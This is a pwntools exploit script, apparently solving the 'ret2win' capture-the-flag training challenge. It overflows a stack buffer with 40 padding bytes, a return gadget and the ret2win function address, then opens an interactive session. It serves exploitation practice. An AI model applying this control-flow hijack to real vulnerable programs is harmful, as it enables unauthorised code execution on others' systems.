#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2win')
context.terminal = ['tmux','splitw','-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b ret2win
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

g = cyclic_gen()
payload = g.get(100)

#pwn cyclic -l kaaa

payload = b"A" * 40
payload += p64(0x40053e)
payload += p64(exe.symbols["ret2win"])

#open('payload', 'wb').write(payload)

io.recvuntil(">")

io.clean()

io.sendline(payload)

#io.recvline(timeout = 2)
#io.recvline(timeout = 2)

#kill dead pane - ctrl b + x

io.interactive()

